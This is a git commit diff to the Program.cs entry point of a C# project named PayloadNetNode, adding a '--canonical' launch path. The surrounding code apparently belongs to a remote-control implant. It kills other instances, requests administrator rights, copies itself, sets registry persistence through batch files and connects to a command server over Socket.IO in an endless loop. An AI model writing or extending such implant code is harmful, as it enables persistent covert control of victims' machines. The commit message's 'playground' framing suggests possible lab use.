68e0aa84e2332f9af7fe98ffb7dab1908aec0933
stevetsang852 <72596467+stevetsang852@users.noreply.github.com>
2026-09-24 16:20:09 +0800

    Allow PayloadNetNode --canonical to use TLS playground client only.

--- PayloadNetNode/Program.cs
+++ PayloadNetNode/Program.cs
@@ -1,11 +1,12 @@
-﻿
-using System.Reflection.Metadata;
-using System.Runtime.InteropServices;
-using CommonClassLibrary;
-using Microsoft.VisualBasic;
 using Payload.Command;
 using Payload.Core.Command;
 using static CommonClassLibrary.Common.AppExitEvent;
+using CommonClassLibrary;
+
+if (args.Any(argument => string.Equals(argument, "--canonical", StringComparison.OrdinalIgnoreCase)))
+{
+    return await Payload.CanonicalAgentHost.RunAsync(args);
+}
 
 new KillOtherMeFactory().CreateCommand().Execute();
 new CallAdminFactory().CreateCommand().Execute();
@@ -18,7 +19,7 @@ if (Config.IsDebug() || !Config.Instance.IsUserAdministrator())
 
 if (!Config.Instance.CheckWorkingTarget())
 {
-    CopyItselfCommand CopyItselfCommand = new CopyItselfFactory().CreateCommand();    
+    CopyItselfCommand CopyItselfCommand = new CopyItselfFactory().CreateCommand();
     CopyItselfCommand.Undo();
     CopyItselfCommand.Execute();
     new StartProcessBatFactory().CreateCommand().Execute();
@@ -29,12 +30,10 @@ new RegistryKeyBatFactory().CreateCommand().Execute();
 
 var payloadSocketClient = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);
 
-// Register the Exit Event handler
 DefaultConsoleCtrlHandler(
     () => {
         payloadSocketClient.StopClient();
     });
-
 
 while (true)
 {
